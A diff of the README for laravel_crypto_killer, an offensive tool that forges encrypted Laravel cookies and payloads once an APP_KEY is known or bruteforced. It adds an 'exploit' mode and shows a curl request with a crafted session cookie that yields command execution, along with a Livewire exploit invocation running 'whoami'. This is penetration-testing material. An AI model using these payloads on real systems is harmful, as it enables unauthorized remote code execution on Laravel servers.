@@ -20,7 +20,7 @@ A helper can be used on each option to use the tool:
 
 ```bash
 $ ./laravel_crypto_killer.py -h
-usage: laravel_crypto_killer.py [-h] {encrypt,decrypt,bruteforce,check} ...
+usage: laravel_crypto_killer.py [-h] {exploit,encrypt,decrypt,bruteforce} ...
 
  ___                                _       ___                    _             __       _   _              
 (O O)                              (_ )    ( O_`\                 ( )_          ( O)    _(_ )(_ )            
@@ -30,11 +30,27 @@ usage: laravel_crypto_killer.py [-h] {encrypt,decrypt,bruteforce,check} ...
 <_____/`\__,_(_) `\__,_`\___/`\____(___)  <_____/(_)  `\__, | ,__/`\__`\___/'  <__)  (_(_(___(___`\____(_)   
                                                      ( )_| | |                                             
                                                      `\___/(_)                                             
-  {encrypt,decrypt,bruteforce}
+        This tool was firstly designed to craft payload targetting the Laravel decrypt() function from the package Illuminate\Encryption.
+        
+        It can also be used to decrypt any data encrypted via encrypt() or encryptString().
+
+        The tool requires a valid APP_KEY to be used, you can also try to bruteforce them if you think there is a potential key reuse from a public project for example.
+
+        Authors of the tool : @_remsio_, @Kainx42
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        
+
+options:
+  -h, --help            show this help message and exit
+
+subcommands:
+  You can use the option -h on each subcommand to get more info
+
+  {exploit,encrypt,decrypt,bruteforce}
+    exploit             Exploit mode
     encrypt             Encrypt mode
     decrypt             Decrypt mode
     bruteforce          Bruteforce potential values of APP_KEY. By default, all the values from the folder wordlists will be loaded.
-    check               Check the validity of an APP_KEY against a website
 
 $ ./laravel_crypto_killer.py encrypt -h
 usage: laravel_crypto_killer.py encrypt [-h] [--key KEY] --value VALUE
@@ -213,6 +229,15 @@ Finally, use this chain to get your remote command execution. Be careful you als
 ```bash
 $ curl -s -H 'Cookie:laravel_session=eyJpdiI6IkxBODRMMTZXVCtQSnFTU0pQcGNjV2c9PSIsInZhbHVlIjoiQVo4c3VQUUdwb1VkZ3VvaTFnK21Jay9NaGlhZmlPSCtRWW1ObmZlY2xmT21RYnhOVk9IeitoeWdoQ3A4NGRMYWExM2JvQmFUZlJxaGZiSmRqK2UxN0pmWVpiWnZsWStnVENvV0VlZEFnSTdlT09sbU5DN2p6eU5vTkFoYlYyc0EiLCJtYWMiOiI1Mzg3YjZjZjM1ZmRiNGQ3M2QwZTBlNTI0ODg1NWFlODM1YjFkZGVlYWNlMjcwNWQ3Yjg5MWIzMDY4Mzc1MzI0IiwidGFnIjoiIn0%3D;  d6WRg1VnF4sWv47men3oo4zBKLylyACOTKGsggKp=eyJp[...]]k0a21JN0Z2a3dYUmOGJlMWI4MjA0ZmIzNCIsICJ0YWciOiAiIn0=' http://localhost/login | head -n1
 uid=1000(user) gid=1000(user) groups=1000(user),0(root),33(www-data)
+```
+
+## Exploit mode
+
+- Livewire :
+
+```bash
+$ python3 laravel_crypto_killer.py exploit -e livewire -k 'base64:CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA=' -j request.json --function system -p whoami
+{...}
 ```
 
 ## Contribution
